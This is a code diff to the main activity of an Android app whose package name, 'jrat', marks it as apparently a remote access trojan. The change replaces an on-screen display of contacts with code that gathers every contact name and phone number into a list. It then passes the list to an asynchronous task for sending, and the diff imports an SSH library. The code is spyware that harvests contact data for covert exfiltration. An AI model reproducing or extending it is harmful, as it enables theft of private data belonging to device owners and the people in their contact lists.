@@ -2,15 +2,30 @@ package com.julioxus.jrat;
 
 import android.content.ContentResolver;
 import android.database.Cursor;
+import android.os.Environment;
 import android.provider.ContactsContract;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.util.Pair;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.view.View;
 import android.widget.Toast;
 
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.OutputStream;
+import java.util.ArrayList;
+import java.util.Properties;
+
+import com.jcraft.jsch.*;
+
 public class MainActivity extends AppCompatActivity {
+
+
+    //Conctacts list data structure
+    ArrayList<Pair<String, String>> contacts = new ArrayList<>();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -40,7 +55,9 @@ public class MainActivity extends AppCompatActivity {
         return super.onOptionsItemSelected(item);
     }
 
-    public void getContacts(View view){
+    // Function to save all contacts of the user in a data structure.
+    public void getContacts(View view) throws IOException {
+
         ContentResolver cr = getContentResolver();
         Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                 null, null, null, null);
@@ -53,15 +70,26 @@ public class MainActivity extends AppCompatActivity {
                     Cursor pCur = cr.query(
                             ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                             null,
-                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                             new String[]{id}, null);
                     while (pCur.moveToNext()) {
                         String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                        Toast.makeText(getApplicationContext(), "Name: " + name + ", Phone No: " + phoneNo, Toast.LENGTH_SHORT).show();
+                        Pair contact = new Pair(name, phoneNo);
+                        contacts.add(contact);
                     }
                     pCur.close();
                 }
             }
         }
+
+        try {
+            sendContacts();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    void sendContacts() throws IOException {
+        new SendContactListAsyncTask(this,contacts).execute();
     }
 }
